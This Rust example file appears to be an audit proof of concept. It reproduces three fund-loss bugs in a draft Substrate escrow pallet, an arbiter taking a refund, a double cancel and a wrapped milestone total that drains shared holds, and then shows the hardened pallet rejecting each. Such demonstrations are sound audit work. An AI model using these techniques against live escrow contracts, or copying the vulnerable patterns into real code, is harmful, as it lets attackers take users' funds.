//! Proofs of concept for the three fund-loss findings in `audit/REPORT.md`, run against the
//! audited first draft (`pallet-escrow-v0`) and then against the hardened pallet.
//!
//! cargo run --release -p escrow-harness --example poc
//!
//! Build without overflow checks (the default for `--release`, and how runtimes are built) to
//! see ESC-03's real on-chain effect; with overflow checks the first call panics instead.

use escrow_harness::{
	runtimes::{v0, v2},
	spec::Target,
};
use frame_support::traits::fungible::{Inspect, InspectHold};

const PAYER: u64 = 1;
const HONEST: u64 = 2;
const PUPPET: u64 = 3;
const ARBITER: u64 = 4;

fn v0_state(label: &str) {
	let held = v0::Balances::balance_on_hold(&pallet_escrow_v0::HoldReason::Escrow.into(), &PAYER);
	println!(
		"  {label:<44} payer free {:>6}  payer held {:>6}  honest {:>6}  puppet {:>6}  arbiter {:>6}",
		v0::Balances::balance(&PAYER),
		held,
		v0::Balances::balance(&HONEST),
		v0::Balances::balance(&PUPPET),
		v0::Balances::balance(&ARBITER),
	);
}

fn signed(who: u64) -> v0::RuntimeOrigin {
	v0::RuntimeOrigin::signed(who)
}

fn esc01_arbiter_takes_the_refund() {
	println!("ESC-01: the arbiter's refund is paid to the arbiter");
	v0::V0::new_ext().execute_with(|| {
		v0::Escrow::create(signed(PAYER), HONEST, Some(ARBITER), vec![1_000], 100).unwrap();
		v0_state("payer escrows 1000 for honest, arbiter set");
		v0::Escrow::refund(signed(ARBITER), 0).unwrap();
		v0_state("arbiter calls refund");
	});
}

fn esc02_double_cancel_unfunds_other_escrows() {
	println!("\nESC-02: cancelling twice releases another escrow's funds to the payer");
	v0::V0::new_ext().execute_with(|| {
		v0::Escrow::create(signed(PAYER), HONEST, None, vec![1_000], 100).unwrap();
		v0::Escrow::create(signed(PAYER), PUPPET, None, vec![1_000], 100).unwrap();
		v0_state("payer escrows 1000 for honest, 1000 for puppet");
		v0::Escrow::cancel(signed(PUPPET), 1).unwrap();
		v0::Escrow::cancel(signed(PUPPET), 1).unwrap();
		v0_state("puppet cancels escrow 1 twice");
		let paid = v0::Escrow::release(signed(PAYER), 0);
		v0_state(&format!("payer 'releases' honest's escrow: {paid:?}"));
	});
}

fn esc03_wrapped_total_drains_the_shared_hold() {
	println!("\nESC-03: a wrapped milestone total pays out another escrow's funds");
	v0::V0::new_ext().execute_with(|| {
		v0::Escrow::create(signed(PAYER), HONEST, None, vec![1_000], 100).unwrap();
		v0_state("payer escrows 1000 for honest");
		// u64::MAX - 5 + 10 wraps to 4: the pallet holds 4 for a 18-quintillion milestone.
		let created = std::panic::catch_unwind(|| {
			v0::Escrow::create(signed(PAYER), PUPPET, None, vec![u64::MAX - 5, 10], 100)
		});
		match created {
			Err(_) => {
				println!("  create panicked: this build has overflow checks; rerun with --release");
				return;
			},
			Ok(r) => r.unwrap(),
		}
		v0_state("payer opens [u64::MAX-5, 10] for puppet");
		v0::Escrow::release(signed(PAYER), 1).unwrap();
		v0_state("payer releases puppet's first milestone");
		let paid = v0::Escrow::release(signed(PAYER), 0);
		v0_state(&format!("payer releases honest's escrow: {paid:?}"));
	});
}

type Milestones = frame_support::BoundedVec<
	pallet_escrow::Milestone<u128, u64>,
	frame_support::traits::ConstU32<{ v2::MAX_MILESTONES }>,
>;

/// Milestones due at block 100.
fn ms(amounts: Vec<u128>) -> Milestones {
	let milestones: Vec<_> = amounts
		.into_iter()
		.map(|amount| pallet_escrow::Milestone { amount, deadline: 100 })
		.collect();
	milestones.try_into().unwrap()
}

fn hardened_pallet_blocks_all_three() {
	println!("\nSame steps against the hardened pallet:");
	v2::V2::new_ext().execute_with(|| {
		let o = |who: u64| v2::RuntimeOrigin::signed(who.into());
		let (honest, puppet) = (HONEST.into(), PUPPET.into());
		v2::Escrow::create(o(PAYER), honest, Some(ARBITER.into()), ms(vec![1_000])).unwrap();
		v2::Escrow::create(o(PAYER), puppet, None, ms(vec![1_000])).unwrap();
		v2::Escrow::refund(o(ARBITER), 0).unwrap();
		println!(
			"  ESC-01 arbiter refund: arbiter balance {} (unchanged), payer got the funds back",
			v2::Balances::balance(&ARBITER.into())
		);
		v2::Escrow::cancel(o(PUPPET), 1).unwrap();
		println!("  ESC-02 second cancel: {:?}", v2::Escrow::cancel(o(PUPPET), 1));
		println!(
			"  ESC-03 wrapping milestones: {:?}",
			v2::Escrow::create(o(PAYER), puppet, None, ms(vec![u128::MAX - 5, 10]))
		);
	});
}

fn main() {
	esc01_arbiter_takes_the_refund();
	esc02_double_cancel_unfunds_other_escrows();
	esc03_wrapped_total_drains_the_shared_hold();
	hardened_pallet_blocks_all_three();
}
